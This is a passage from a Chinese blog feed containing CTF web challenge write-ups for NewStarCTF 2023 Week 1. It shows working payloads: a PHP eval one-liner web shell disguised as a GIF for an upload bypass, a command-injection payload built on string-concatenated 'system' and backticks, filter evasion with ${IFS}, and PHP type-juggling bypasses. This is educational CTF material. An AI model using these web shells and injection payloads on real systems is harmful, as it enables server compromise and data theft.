class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>过滤了<code>cat</code>，绕过姿势太多了。。<code>ca&#39;&#39;t</code>还有<code>tac</code>啥的都可以。先<code>ls</code>看看当前目录都有啥东西：</p><p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week1</title>
    <link href="/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/"/>
    <url>/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第一周</p><span id="more"></span><hr><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>题目描述：粗心的网站管理员总会泄漏一些敏感信息在Web根目录下</p><p>这题一开始想用dirsearch扫的，但是嫌时间太长了就直接试了一些我知道的敏感文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt <span class="hljs-comment">//告诉爬虫啥能爬啥不能爬，不过没啥用，这玩意儿就像防盗门一样，真想偷东西的人才不会管你上没上锁</span><br>www.zip <span class="hljs-comment">//存网站备份文件</span><br></code></pre></td></tr></table></figure><p>VIM和Git泄露没有，就这两个文件下载再打开拼一起就是flag了。</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>题目描述：普通的上传啦，平平淡淡才是真</p><p><img src="/img/a9.png" alt="a9"></p><p>看看源码有啥好东西没：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;file&quot;</span>);<br>            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>];<br>            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();<br>            <br>            <span class="hljs-keyword">if</span> (!file) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>限制了后缀，只允许上传图片。估计是前端验证？那就上传个一句话改成图片格式，burpsuite抓个包再改回去：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GIF89a<br><br><span class="hljs-meta">&lt;?php</span><br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;viper&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/a10.png" alt="a10"></p><p>再改成php后缀就好了，上传路径直接显示再界面了。</p><p><img src="/img/a11.png" alt="a11"></p><p>然后直接蚁剑连，根目录底下拿flag。</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>题目描述：最初的开始</p><p>md说一嘴这题最后一步限制本地用户才能访问卡了我蛮久。。因为我看到<code>只有本地用户才能访问</code>第一想到的就是改<code>X-Forwarded-For：127.0.0.1</code>和<code>Client-Ip</code>字段，但是这俩都没用。我当时人都晕了想不明白为啥不给过。(我当时思路也错了，一直在想IP地址的问题，后面还去找了<code>Authorization</code>字段的信息)。还好当时再看安恒写的那本CTF实战从入门到提升，里面有个题用的X-Real-IP字段。。。运气好把这题做出来了~</p><p><img src="/img/a12.png" alt="a12"></p><p>GET传参，?ctf&#x3D;任意就能过了。</p><p><img src="/img/a13.png" alt="a13"></p><p>POST传参，他说把secret藏起来了，看看源码里有没有啥好东西：</p><p><code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; //大小写数字混合，一眼base64</code></p><p>解码：<code>n3wst4rCTF2023g00000d</code></p><p><img src="/img/a14.png" alt="a14"></p><p>power是否是ctfer？burpsuite抓下包看看有没有这个字段：</p><p><img src="/img/a15.png" alt="a15"></p><p>改下cookie</p><p><img src="/img/a16.png" alt="a16"></p><p>后面就是改User-Agent头和Referer头(一个浏览器信息啥的一个网址来源)。最后他会提示只有本地用户才能通过这关，<code>X-Real-IP:127.0.0.1</code>即可。(可能我这辈子都忘不了X-Real-IP这个头了)。</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>题目描述：Err……..</p><p><img src="/img/a17.png" alt="a17"></p><p>看到这题我第一想到的就是模板注入。。然后在那试49啥的，哈哈。结果直接404了。。他说给他num1和num2，我就试着get传参了<code>?number1=1</code>,结果出了这么个东西：</p><p><img src="/img/a18.png" alt="a18"></p><p>flag就藏在里面。。这个等官方wp出来了还要看一下，这题感觉没做明白。</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>题目描述：PHP是世界上最安全的语言，真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-comment">//一共五个绕过，都拿下后会读.flag的内容。</span><br></code></pre></td></tr></table></figure><p>先是key1key2不相等但md5加密后弱相等。这东西可以用碰撞也可以用两个东西加密后得0e开头的字符串。如果要求强相等的话直接让key1key2是两个数组就行了(无法对数组加密会返回null)。</p><p><code>?key1[]=1&amp;key2[]=2</code></p><p>第二个条件同理，其实我之前还真没碰到过这种条件(一个东西MD5加密后等于该东西SHA1加密后的值)。我当时想着既然都是hash函数那就让key3等于数组呗(强相等绕过)，结果还真绕过了。</p><p><code>strcmp</code>这东西会比较两个字符串中对应位置的ASCII大小，如果相同就继续比较下一个。<code>str1&gt;str2</code>就返回大于0，相同返回0，<code>str1&lt;str2</code>就返回小于0。</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code>题目意思是想让我们输入的<code>key4</code>和<code>flag</code>相等，但我们根本不知道<code>flag</code>是多少。这时可以让<code>key4</code>是一个数组，<code>strcmp</code>比较的是字符串，如果传入其它类型会报错。出错会返回0，实现绕过。</p><p><code>is_numeric</code>，这个简单，直接<code>key5=2024a</code>即可。</p><p>最后一步POST传<code>key3[]=~&amp;flag5=~</code>，只要数组的值别触发正则匹配就行。</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>password经MD5加密后前六位强等于<code>&quot;c4d038&quot;</code>，这东西要写个脚本找，直接用之前做题的脚本改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>():<br>    mubiao = <span class="hljs-string">&#x27;c4d038&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        string = <span class="hljs-built_in">str</span>(i)<br>        hash_object = hashlib.md5(string.encode())<br>        <span class="hljs-keyword">if</span> hash_object.hexdigest()[:<span class="hljs-number">6</span>] == mubiao: <span class="hljs-comment">#切片操作，从零开始取六位</span><br>            <span class="hljs-keyword">return</span> string<br>        i += <span class="hljs-number">1</span><br><br>result = find()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#结果：114514</span><br></code></pre></td></tr></table></figure><p>接下来要给<code>e_v.a.l</code>参数赋值，而且传过去的值经过正则匹配过滤后会被eval执行。<code>e_v.a.l</code>这东西很明显不满足变量名的要求：包含了小数点。看下PHP官方的解释：</p><p><img src="/img/a19.png" alt="a19"></p><p>写一小段代码体会一下咋回事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POST传<code>e_v.a.l=&#39;hellowold!&#39;</code>：</p><p>结果：<code>array(1) &#123;  [&quot;e_v_a_l&quot;]=&gt;  string(12) &quot;&#39;hellowold!&#39;&quot; &#125;</code></p><p>可以看到POST传递的参数从<code>e_v.a.l</code>变成了<code>e_v_a_l</code>，空格同理。(但<code>e_v.a.l</code>参数仍没被赋值)。</p><p>这里 引用下mochu师傅的解释：</p><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p><p>还是上面那串代码，尝试<code>post</code>传参<code>e[v.a.l=&#39;hellowold!&#39;</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;e_v.a.l&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;&#x27;hellowold!&#x27;&quot;</span> &#125;<br>hello<br></code></pre></td></tr></table></figure><p>成功绕过。</p><p>接下来就是怎么绕正则匹配过滤了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>); <br></code></pre></td></tr></table></figure><p>过滤了flag,那猜测flag是藏在&#x2F;flag底下的，直接使用通配符：<code>/fl*</code>即可。过滤了<code>system</code>可以使用<code>(sy.(st).em)</code>绕过(字符串拼接)。过滤了<code>cat</code>那就用<code>tac</code>。这道题过滤地并不怎么严格。</p><p>payload:</p><p>password&#x3D;114514&amp;e[v.a.l&#x3D;(sy.(st).em)(<code>printf &quot;\154\163&quot;</code>);  注意printf前和163“后各有一个反引号。</p><p>这里关于绕过的一些知识在之前写的博客里说了些，就不详细写了(比较懒，哈哈)。</p><p>非法参数名传参的问题参考了这位师傅的文章，感谢！</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>题目描述：简简单单、随心所欲</p><p><img src="/img/a20.png" alt="a20"></p><p>感觉又是最讨厌的SQL注入。。。</p><p>先看看源码里有没有啥东西，主要看看他这个用户名密码是怎么限制的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value, type</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;un&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名长度必须为3-10个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;pw&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">18</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码长度必须为6-18个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9!@#$%^&amp;_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>先注册一下：</p><p><img src="/img/a21.png" alt="a21"></p><p>但提示admin已经被注册过了？弱口令试了挺多但没啥用，登不上去。那就随便注册一个：</p><p><img src="/img/a22.png" alt="a22"></p><p>登录后发现跳转到这么个界面:这玩意儿跟个复读机似的，你打啥东西他就把<code>你</code>和<code>您</code>换成<code>我</code>。<code>吗</code>给换成空格，<code>?</code>换成<code>!</code>。而且这东西不用数据包(???)，burpsuite抓包根本没用。。</p><p>它跳转的时候想到了302重定向的问题，就一直开着burpsuite排查，发现这么个东西：</p><p><img src="/img/a23.png" alt="a23"></p><p>结果那个bv是这么个东西：</p><p><img src="/img/a24.png" alt="a24"></p><p>看这标题我就感觉不对劲了，翻简介的时候根本没有第七行。。(#$$#$%^$#@#$%$#@@#$%^&amp;)。</p><p>如果是SQL注入的话，不知道注入点在哪里。试了挺多弱口令也没试出来。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment">//e[v.a.l=11</span><br></code></pre></td></tr></table></figure><p>感谢mochu师傅的文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
